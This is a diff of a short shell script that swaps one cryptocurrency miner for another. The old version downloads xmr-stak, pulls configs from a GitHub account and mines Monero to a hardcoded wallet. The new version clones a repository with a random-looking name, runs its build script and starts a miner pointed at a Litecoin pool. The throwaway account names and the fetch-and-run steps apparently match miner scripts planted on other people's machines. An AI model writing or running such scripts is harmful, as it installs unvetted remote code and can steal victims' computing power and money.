@@ -1,15 +1,9 @@
-wget https://github.com/fireice-uk/xmr-stak/releases/download/1.0.1-rx/xmr-stak-rx-linux-1.0.1-cpu_cuda-nvidia.tar.xz
+git clone https://github.com/mobileapps84741274/linux84747474744444444474
 
-tar -xvf ./xmr-stak-rx-linux-1.0.1-cpu_cuda-nvidia.tar.xz
+cd ./linux84747474744444444474/
 
-cd xmr-stak-rx-linux-1.0.1-cpu_cuda-nvidia
+bash ./build.sh
 
-wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/nvidia.txt
+cd ./linux84747474744444444474/
 
-wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/pools.txt
-
-wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/config.txt
-
-cd xmr-stak-rx-linux-1.0.1-cpu_cuda-nvidia
-
-./xmr-stak-rx --noTest -u 49sgRRRrxy9F1P9gdsDgXk7AXroSQ5Xw68CvfghLDFx9MvJ5PdJut4JKQXtTZEtN9JJ3EJnio8cZVHZ56oXBmeNG9qtj3wD -p linux84 -o pool.supportxmr.com:3333
+./cclinux8488 -a scrypt -o stratum+tcp://litecoinpool.org:3333 -u linux8474.1 -p 1
